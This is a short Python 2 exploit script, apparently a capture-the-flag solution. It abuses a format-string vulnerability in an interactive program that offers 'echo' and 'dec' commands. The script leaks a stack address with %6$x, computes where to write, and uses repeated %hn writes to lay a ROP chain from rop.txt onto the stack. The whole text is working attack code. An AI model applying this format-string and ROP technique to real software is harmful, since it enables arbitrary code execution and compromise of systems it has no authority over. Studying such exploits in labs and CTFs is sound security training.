#!/usr/bin/env python2

import os, sys, struct

# echo %1$x %2$x %3$x %4$x %5$x %6$x %7$x %8$x %9$x %10$x %11$x %12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x %24$x %25$x %26$x %27$x %28$x %29$x %30$x

# 0xffb9d7d4, dec save
# %6$x -> 0xffb9d7b8
# ebp in loop -> 0xffb9d7e8 -> %30$x
# so dec save should be in %26$x

s = open('rop.txt').read()

print 'echo %6$x'
sys.stdout.flush()

ref = raw_input('')

base = int(ref, 16) + 0xffb9d7e8 + 4 - 0xffb9d7b8

def write(addr, value):
    print 'dec %s' % hex(addr)[2:]
    print 'echo %%%06du%%25$hn' % struct.unpack('<H', value)
    sys.stdout.flush()
    
for i in range(0, len(s), 2):
    write(base + i, s[i:i+2])


